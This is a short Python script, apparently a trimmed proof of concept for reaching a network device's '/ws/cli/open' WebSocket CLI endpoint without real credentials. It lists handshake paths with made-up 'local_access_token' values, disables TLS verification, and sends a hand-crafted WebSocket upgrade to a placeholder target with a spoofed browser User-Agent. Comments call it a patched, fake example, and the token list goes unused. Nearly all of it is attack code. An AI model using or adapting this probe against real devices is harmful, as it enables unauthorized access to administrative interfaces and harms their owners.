#!/usr/bin/env python3

# --- PATCHED VERSION (Short Form) ---
# Handshake Paths (Patched)
WS_HANDSHAKE_PATHS = [
    "/ws/cli/open?local_access_token=a5a5a5a5a5a5adasda8sd8sd8ewerfgfg",
    "/ws/cli/open?local_access_token=1337",
    "/ws/cli/open?cols=162&rows=100&local_access_token=ScaryBYte",
    "/ws/cli/open?local_access_token=ScaryBYte&cols=162&rows=100",
    "/ws/cli/open?cols=162&rows=100",
    "/ws/cli/open",
]


# Fake example WebSocket handshake usage:
import socket, ssl, base64

host = "target-ip"
port = 443
use_ssl = True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if use_ssl:
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    s = context.wrap_socket(s)

s.connect((host, port))
ws_key = base64.b64encode(b'AAAAAAAAAAAAAAAA').decode()
upgrade_request = (
    f"GET /ws/cli/open HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {ws_key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n"
    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    f"\r\n"
)
s.sendall(upgrade_request.encode())
print(s.recv(1024).decode(errors='replace'))

s.close()
